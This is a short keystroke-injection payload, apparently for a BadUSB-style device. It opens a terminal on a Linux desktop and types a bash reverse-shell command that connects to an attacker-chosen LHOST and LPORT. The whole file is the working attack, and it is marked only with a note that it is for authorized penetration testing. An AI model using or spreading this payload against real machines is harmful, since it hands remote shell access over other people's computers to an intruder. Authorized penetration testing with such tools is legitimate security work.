// Reverse Shell (Linux) — Bash reverse TCP. Set LHOST/LPORT before use.
// WARNING: For authorized penetration testing only.
var LHOST = "CHANGE_ME";
var LPORT = "4444";

layout('us');
delay(1000);

// Open terminal (Ctrl+Alt+T is common on Ubuntu/Debian)
press("CTRL ALT t");
delay(1500);

type("bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1\n");
